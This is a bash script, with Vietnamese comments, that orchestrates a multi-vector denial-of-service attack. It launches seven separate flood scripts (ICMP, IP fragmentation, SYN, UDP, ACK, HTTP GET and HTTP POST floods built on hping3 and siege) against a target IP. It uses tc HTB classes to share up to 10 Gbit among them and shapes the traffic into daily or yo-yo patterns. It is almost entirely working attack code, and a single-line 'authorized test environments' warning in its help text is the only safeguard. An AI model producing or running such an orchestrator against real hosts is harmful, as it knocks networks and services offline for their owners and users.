#!/bin/bash

# =================================================================
#           MULTI-VECTOR DoS ORCHESTRATOR với HTB
#           Quản lý 7 vectors với HTB classes độc lập
# =================================================================

TARGET_IP="${1:-192.168.1.120}"
INTERFACE="${2:-br-ex}"
DURATION="${3:-300}"
TIME_COMPRESSION="${4:-72}"
MODE="${5:-python-compressed}"
YOYO_TYPE="${6:-square}"
LOG_FILE="multi_vector_orchestrator_$(date +%Y%m%d_%H%M%S).log"

# Paths to scripts - SỬA ĐƯỜNG DẪN NÀY
SCRIPT_DIR="/home/minh"

SCRIPTS=(
    "simulator_ICMP_htb.sh"
    "simulator_IP_Fragment_htb.sh"
    "simulator_SYN_htb.sh"
    "simulator_UDP_htb.sh"
    "simulator_ACK_htb.sh"
    "simulator_HTTP_GET_flood.sh"
    "simulator_HTTP_POST_flood.sh"
)

# Phân chia bandwidth % cho từng vector (tổng = 100%)
declare -A VECTOR_WEIGHT=(
    ["simulator_ICMP_htb"]=15
    ["simulator_IP_Fragment_htb"]=15
    ["simulator_SYN_htb"]=20
    ["simulator_UDP_htb"]=15
    ["simulator_ACK_htb"]=10
    ["simulator_HTTP_GET_flood"]=15
    ["simulator_HTTP_POST_flood"]=10
)

# HTB config
TOTAL_BANDWIDTH="10gbit"
MIN_RATE="1kbit"
BURST="15k"
CBURST="1540"

# State tracking
declare -A VECTOR_PIDS
declare -A VECTOR_CLASSES
declare -A VECTOR_RATES
declare -A VECTOR_LAST_UPDATE
MONITOR_PID=""
TC_ACTIVE=false
PYTHON_AVAILABLE=false

# =================================================================
#                        CORE FUNCTIONS
# =================================================================

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "=== CLEANUP STARTED ==="
    
    # Kill monitor
    if [ -n "$MONITOR_PID" ] && kill -0 "$MONITOR_PID" 2>/dev/null; then
        log "Stopping monitor (PID: $MONITOR_PID)"
        kill -TERM "$MONITOR_PID" 2>/dev/null
        sleep 1
        kill -KILL "$MONITOR_PID" 2>/dev/null 2>&1
    fi
    
    # Kill all vectors
    for vector in "${!VECTOR_PIDS[@]}"; do
        local pid="${VECTOR_PIDS[$vector]}"
        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
            log "Stopping $vector (PID: $pid)"
            kill -TERM "$pid" 2>/dev/null
            sleep 1
            kill -KILL "$pid" 2>/dev/null 2>&1
        fi
    done
    
    # Force kill any remaining processes
    pkill -9 hping3 2>/dev/null
    pkill -9 siege 2>/dev/null
    
    # Remove HTB qdisc
    if [ "$TC_ACTIVE" = true ]; then
        log "Removing HTB qdisc from $INTERFACE"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
        TC_ACTIVE=false
    fi
    
    # Cleanup temp files
    rm -f /tmp/tc_wrapper_*.sh 2>/dev/null
    rm -f /tmp/tc 2>/dev/null
    rm -f /tmp/traffic_calculator.py 2>/dev/null
    
    log "=== CLEANUP COMPLETED ==="
    exit 0
}

trap cleanup EXIT INT TERM

# =================================================================
#                     DEPENDENCY CHECKS
# =================================================================

check_dependencies() {
    local missing=()
    
    # Check commands
    for cmd in hping3 siege bc tc awk grep; do
        if ! command -v $cmd &>/dev/null; then
            missing+=($cmd)
        fi
    done
    
    # Check root
    if [[ $EUID -ne 0 ]]; then
        log "ERROR: Root privileges required"
        exit 1
    fi
    
    if [ ${#missing[@]} -gt 0 ]; then
        log "ERROR: Missing dependencies: ${missing[*]}"
        log "Install with: apt install ${missing[*]}"
        exit 1
    fi
    
    # Check interface
    if ! ip link show "$INTERFACE" &>/dev/null; then
        log "ERROR: Interface $INTERFACE does not exist"
        log "Available interfaces:"
        ip -o link show | awk -F': ' '{print "  - " $2}'
        exit 1
    fi
    
    # Check scripts
    for script in "${SCRIPTS[@]}"; do
        if [ ! -f "$SCRIPT_DIR/$script" ]; then
            log "ERROR: Script not found: $SCRIPT_DIR/$script"
            exit 1
        fi
        if [ ! -x "$SCRIPT_DIR/$script" ]; then
            log "WARNING: Making $script executable"
            chmod +x "$SCRIPT_DIR/$script"
        fi
    done
    
    log "✓ All dependencies satisfied"
}

check_python() {
    if command -v python3 &> /dev/null; then
        if python3 -c "import math; import random" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "✓ Python3 with math module available"
            return 0
        fi
    fi
    
    if command -v python &> /dev/null; then
        if python -c "import math; import random" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "✓ Python with math module available"
            return 0
        fi
    fi
    
    log "WARNING: Python not available"
    PYTHON_AVAILABLE=false
    return 1
}

# =================================================================
#                        HTB SETUP
# =================================================================

init_htb_qdisc() {
    log "Initializing HTB qdisc on $INTERFACE"
    
    # Remove existing qdisc
    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    sleep 1
    
    # Create HTB root qdisc
    if ! tc qdisc add dev "$INTERFACE" root handle 1: htb default 99; then
        log "ERROR: Failed to create HTB root qdisc"
        return 1
    fi
    
    # Create root class
    if ! tc class add dev "$INTERFACE" parent 1: classid 1:1 htb rate "$TOTAL_BANDWIDTH" ceil "$TOTAL_BANDWIDTH"; then
        log "ERROR: Failed to create root class"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null
        return 1
    fi
    
    # Create class for each vector
    local classid=10
    log "Creating HTB classes:"
    
    for script in "${SCRIPTS[@]}"; do
        local vector_name=$(basename "$script" .sh)
        local weight=${VECTOR_WEIGHT[$vector_name]}
        
        # Create HTB class with minimum rate and ceiling
        if tc class add dev "$INTERFACE" parent 1:1 classid 1:$classid htb \
            rate "$MIN_RATE" ceil "$TOTAL_BANDWIDTH" burst "$BURST" cburst "$CBURST" prio $classid; then
            
            # Add SFQ qdisc to this class for fair queuing
            tc qdisc add dev "$INTERFACE" parent 1:$classid handle $classid: sfq perturb 10
            
            VECTOR_CLASSES[$vector_name]=$classid
            VECTOR_RATES[$vector_name]=0
            VECTOR_LAST_UPDATE[$vector_name]=0
            
            log "  ✓ Class 1:$classid → $vector_name (${weight}% weight, ceil: $TOTAL_BANDWIDTH)"
        else
            log "  ✗ Failed to create class for $vector_name"
            tc qdisc del dev "$INTERFACE" root 2>/dev/null
            return 1
        fi
        
        classid=$((classid + 1))
    done
    
    # Create default class for unclassified traffic
    tc class add dev "$INTERFACE" parent 1:1 classid 1:99 htb rate "$MIN_RATE" ceil "10mbit"
    tc qdisc add dev "$INTERFACE" parent 1:99 handle 99: sfq perturb 10
    
    TC_ACTIVE=true
    log "✓ HTB qdisc initialized with ${#VECTOR_CLASSES[@]} classes"
    
    # Show HTB structure
    log "HTB structure:"
    tc -s class show dev "$INTERFACE" | grep "class htb" | head -10
    
    return 0
}

update_htb_class() {
    local vector_name="$1"
    local rate_pps="$2"
    
    local classid=${VECTOR_CLASSES[$vector_name]}
    if [ -z "$classid" ]; then
        return 1
    fi
    
    # Tránh update quá thường xuyên (throttle)
    local current_time=$(date +%s)
    local last_update=${VECTOR_LAST_UPDATE[$vector_name]:-0}
    if [ $((current_time - last_update)) -lt 5 ]; then
        return 0  # Skip update nếu < 5s
    fi
    
    # Convert PPS to bandwidth
    local bytes_per_packet=500  # Average
    local bps=$(echo "scale=0; $rate_pps * $bytes_per_packet * 8" | bc -l)
    
    # Minimum bandwidth
    if [ $(echo "$bps < 1000" | bc -l) -eq 1 ]; then
        bps=1000
    fi
    
    # Apply weight multiplier
    local weight=${VECTOR_WEIGHT[$vector_name]:-10}
    local adjusted_bps=$(echo "scale=0; $bps * (1 + $weight / 100)" | bc -l)
    
    # Format bandwidth
    local bandwidth
    if [ $(echo "$adjusted_bps >= 1000000000" | bc -l) -eq 1 ]; then
        bandwidth="$(echo "scale=2; $adjusted_bps / 1000000000" | bc -l)gbit"
    elif [ $(echo "$adjusted_bps >= 1000000" | bc -l) -eq 1 ]; then
        bandwidth="$(echo "scale=2; $adjusted_bps / 1000000" | bc -l)mbit"
    else
        bandwidth="$(echo "scale=0; $adjusted_bps / 1000" | bc -l)kbit"
    fi
    
    # Update HTB class
    if tc class change dev "$INTERFACE" parent 1:1 classid 1:$classid htb \
        rate "$bandwidth" ceil "$TOTAL_BANDWIDTH" burst "$BURST" cburst "$CBURST" 2>/dev/null; then
        
        VECTOR_LAST_UPDATE[$vector_name]=$current_time
        return 0
    else
        return 1
    fi
}

# =================================================================
#                    VECTOR MANAGEMENT
# =================================================================

create_tc_wrapper() {
    # Tạo wrapper script để vô hiệu hóa tc trong child processes
    cat > /tmp/tc_wrapper_$$.sh << 'EOF'
#!/bin/bash
# TC wrapper: block all tc commands from child scripts
exit 0
EOF
    chmod +x /tmp/tc_wrapper_$$.sh
}

start_vector() {
    local script="$1"
    local vector_name=$(basename "$script" .sh)
    local classid=${VECTOR_CLASSES[$vector_name]}
    
    log "Starting: $vector_name → HTB class 1:$classid"
    
    # Create tc wrapper if not exists
    if [ ! -f /tmp/tc_wrapper_$$.sh ]; then
        create_tc_wrapper
    fi
    
    # Start vector in subshell with modified environment
    (
        # Override tc command
        export PATH="/tmp:$PATH"
        ln -sf /tmp/tc_wrapper_$$.sh /tmp/tc 2>/dev/null
        
        # Change to script directory
        cd "$SCRIPT_DIR" || exit 1
        
        # Start appropriate script
        if [[ "$script" == *"siege"* ]]; then
            # Siege needs URL with http://
            local target_url="http://$TARGET_IP"
            bash "$script" "$target_url" "$INTERFACE" "$DURATION" "$TIME_COMPRESSION" "$MODE" "$YOYO_TYPE" 2>&1 | \
                grep -v "tc qdisc" | grep -v "ERROR.*tc" &
        else
            # hping3 scripts need IP only
            bash "$script" "$TARGET_IP" "$INTERFACE" "$DURATION" "$TIME_COMPRESSION" "$MODE" "$YOYO_TYPE" 2>&1 | \
                grep -v "tc qdisc" | grep -v "ERROR.*tc" &
        fi
    ) &
    
    local pid=$!
    VECTOR_PIDS[$vector_name]=$pid
    
    sleep 1
    
    # Verify process started
    if kill -0 "$pid" 2>/dev/null; then
        log "  ✓ Started (PID: $pid)"
        return 0
    else
        log "  ✗ Failed to start"
        return 1
    fi
}

# =================================================================
#                    RATE EXTRACTION
# =================================================================

extract_rate_from_log() {
    local script="$1"
    local vector_name=$(basename "$script" .sh)
    
    # Find latest log file for this vector
    local log_pattern="${vector_name}*$(date +%Y%m%d)*.log"
    local latest_log=$(find "$SCRIPT_DIR" -maxdepth 1 -name "$log_pattern" -type f -printf '%T@ %p\n' 2>/dev/null | \
                       sort -rn | head -1 | cut -d' ' -f2-)
    
    if [ -z "$latest_log" ] || [ ! -f "$latest_log" ]; then
        return 1
    fi
    
    # Extract PPS/RPS from last 50 lines
    local rate=$(tail -n 50 "$latest_log" 2>/dev/null | \
                 grep -oP '(?<=PPS: |RPS: )\d+' | \
                 tail -1)
    
    if [ -z "$rate" ]; then
        return 1
    fi
    
    # Validate rate
    if [[ "$rate" =~ ^[0-9]+$ ]] && [ "$rate" -gt 0 ]; then
        local old_rate=${VECTOR_RATES[$vector_name]:-0}
        VECTOR_RATES[$vector_name]=$rate
        
        # Update HTB class
        if update_htb_class "$vector_name" "$rate"; then
            if [ "$rate" != "$old_rate" ]; then
                return 0  # Changed
            fi
        fi
    fi
    
    return 1
}

# =================================================================
#                    MONITORING
# =================================================================

monitor_vectors() {
    log "=== HTB MONITOR STARTED ==="
    log "Update interval: 10s"
    log "Monitoring mode: $MODE"
    
    local update_interval=10
    local iteration=0
    
    while true; do
        sleep $update_interval
        iteration=$((iteration + 1))
        
        # Check active vectors
        local active_vectors=()
        for vector in "${!VECTOR_PIDS[@]}"; do
            if kill -0 "${VECTOR_PIDS[$vector]}" 2>/dev/null; then
                active_vectors+=("$vector")
            fi
        done
        
        local active_count=${#active_vectors[@]}
        
        if [ $active_count -eq 0 ]; then
            log "All vectors stopped, exiting monitor"
            break
        fi
        
        # Extract rates from logs
        local changed_count=0
        for script in "${SCRIPTS[@]}"; do
            if extract_rate_from_log "$script"; then
                changed_count=$((changed_count + 1))
            fi
        done
        
        # Periodic status report (every 6 iterations = 60s)
        if [ $((iteration % 6)) -eq 0 ]; then
            log "--- Status Update (Iteration $iteration, Active: $active_count/7) ---"
            
            local total_pps=0
            for vector in "${!VECTOR_RATES[@]}"; do
                local rate=${VECTOR_RATES[$vector]}
                local weight=${VECTOR_WEIGHT[$vector]}
                local classid=${VECTOR_CLASSES[$vector]}
                
                total_pps=$((total_pps + rate))
                
                if [ $rate -gt 0 ]; then
                    log "  $vector (1:$classid): ${rate} PPS [${weight}%]"
                fi
            done
            
            log "  TOTAL: ${total_pps} PPS"
            
            if [ $changed_count -gt 0 ]; then
                log "  Updated: $changed_count classes"
            fi
        fi
    done
    
    log "=== MONITOR STOPPED ==="
}

# =================================================================
#                        MAIN
# =================================================================

show_usage() {
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════════════════╗
║          MULTI-VECTOR DoS ORCHESTRATOR with HTB                           ║
║          Manages 7 attack vectors with isolated HTB classes               ║
╚═══════════════════════════════════════════════════════════════════════════╝

USAGE:
  ./multi_vector_orchestrator_htb.sh [TARGET_IP] [INTERFACE] [DURATION] \
                                      [TIME_COMPRESSION] [MODE] [YOYO_TYPE]

PARAMETERS:
  TARGET_IP         Target IP address (default: 192.168.1.120)
  INTERFACE         Network interface (default: br-ex)
  DURATION          Test duration in seconds (default: 300)
  TIME_COMPRESSION  Time compression factor (default: 72)
  MODE              Traffic pattern mode (default: python-compressed)
                    - python-compressed: Realistic daily/weekly patterns
                    - python-yoyo: Yo-yo patterns (square, sawtooth, burst)
  YOYO_TYPE         Yo-yo pattern type (default: square)
                    - square, sawtooth, burst

BANDWIDTH ALLOCATION:
  Total: 10Gbit (configurable via TOTAL_BANDWIDTH variable)
  
  Vector Distribution:
    • ICMP Flood:        15% weight
    • IP Fragmentation:  15% weight
    • SYN Flood:         20% weight
    • UDP Flood:         15% weight
    • ACK Flood:         10% weight
    • HTTP GET Flood:    15% weight
    • HTTP POST Flood:   10% weight

HOW IT WORKS:
  1. Creates HTB qdisc with 7 classes (one per vector)
  2. Each vector runs independently with its own pattern
  3. Monitor reads logs every 10s and updates HTB class rates
  4. HTB automatically distributes bandwidth based on weights + demand
  5. Each vector's pattern is preserved (morning peak, evening peak, etc.)

ARCHITECTURE:
  ┌─────────────────────────────────────┐
  │   HTB Root (1:1) - 10Gbit          │
  └──┬──────┬──────┬──────┬──────┬─────┘
     │      │      │      │      │
  1:10   1:11   1:12   1:13  ... 1:16
  ICMP   Frag   SYN    UDP      POST
  (15%)  (15%)  (20%)  (15%)    (10%)
     ↑      ↑      ↑      ↑        ↑
  Script Script Script Script  Script
  runs   runs   runs   runs    runs
  with   with   with   with    with
  pattern pattern pattern pattern pattern

EXAMPLES:
  # Basic compressed time simulation
  ./multi_vector_orchestrator_htb.sh 192.168.1.120 br-ex 300 72
  
  # Yo-yo pattern with square wave
  ./multi_vector_orchestrator_htb.sh 192.168.1.120 br-ex 300 72 python-yoyo square
  
  # Long simulation with sawtooth pattern
  ./multi_vector_orchestrator_htb.sh 192.168.1.120 br-ex 600 144 python-yoyo sawtooth

REQUIREMENTS:
  - Root privileges
  - hping3, siege, bc, tc (iproute2)
  - Python3 with math module (recommended)
  - All 7 DoS scripts in SCRIPT_DIR

CONFIGURATION:
  Edit these variables in the script:
  - SCRIPT_DIR: Path to your DoS scripts
  - VECTOR_WEIGHT: Bandwidth allocation percentages
  - TOTAL_BANDWIDTH: Maximum total bandwidth

MONITORING:
  - Status updates every 60 seconds
  - Individual vector rates logged
  - HTB class updates logged
  - All activity in timestamped log file

WARNING:
  This tool generates significant network traffic.
  Use only in authorized test environments.

EOF
}

main() {
    # Show header
    echo "╔═══════════════════════════════════════════════════════════════════════════╗"
    echo "║          MULTI-VECTOR DoS ORCHESTRATOR with HTB                           ║"
    echo "╚═══════════════════════════════════════════════════════════════════════════╝"
    echo ""
    
    log "=== ORCHESTRATOR STARTED ==="
    log "Target: $TARGET_IP"
    log "Interface: $INTERFACE"
    log "Duration: ${DURATION}s"
    log "Time Compression: ${TIME_COMPRESSION}x"
    log "Mode: $MODE"
    if [ "$MODE" = "python-yoyo" ]; then
        log "Yo-yo Type: $YOYO_TYPE"
    fi
    log "Total Bandwidth: $TOTAL_BANDWIDTH"
    log "Script Directory: $SCRIPT_DIR"
    log ""
    
    # Bandwidth allocation
    log "Bandwidth Allocation:"
    for vector in "${!VECTOR_WEIGHT[@]}"; do
        log "  • $vector: ${VECTOR_WEIGHT[$vector]}%"
    done
    log ""
    
    # Checks
    check_dependencies
    check_python
    log ""
    
    # Initialize HTB
    if ! init_htb_qdisc; then
        log "ERROR: Failed to initialize HTB qdisc"
        exit 1
    fi
    log ""
    
    # Start vectors
    log "Starting vectors (staggered startup)..."
    local started_count=0
    for script in "${SCRIPTS[@]}"; do
        if start_vector "$script"; then
            started_count=$((started_count + 1))
        fi
        sleep 3  # Stagger startup
    done
    
    if [ $started_count -eq 0 ]; then
        log "ERROR: No vectors started successfully"
        exit 1
    fi
    
    log ""
    log "Started $started_count/${#SCRIPTS[@]} vectors"
    log "Waiting 15s for stabilization..."
    sleep 15
    log ""
    
    # Start monitor
    monitor_vectors &
    MONITOR_PID=$!
    log "✓ Monitor started (PID: $MONITOR_PID)"
    log ""
    
    log "Running attack for ${DURATION}s..."
    log "Press Ctrl+C to stop early"
    log ""
    
    # Wait for all vectors
    for vector in "${!VECTOR_PIDS[@]}"; do
        wait "${VECTOR_PIDS[$vector]}" 2>/dev/null
    done
    
    # Stop monitor
    if [ -n "$MONITOR_PID" ] && kill -0 "$MONITOR_PID" 2>/dev/null; then
        kill -TERM "$MONITOR_PID" 2>/dev/null
    fi
    
    log ""
    log "=== ALL VECTORS COMPLETED ==="
    log "Log file: $LOG_FILE"
    log ""
    
    # Final HTB stats
    log "Final HTB statistics:"
    tc -s class show dev "$INTERFACE" | grep -A 2 "class htb 1:1[0-6]"
}

# Command line handling
if [[ "$1" == "-h" || "$1" == "--help" || "$1" == "help" ]]; then
    show_usage
    exit 0
fi

main "$@"
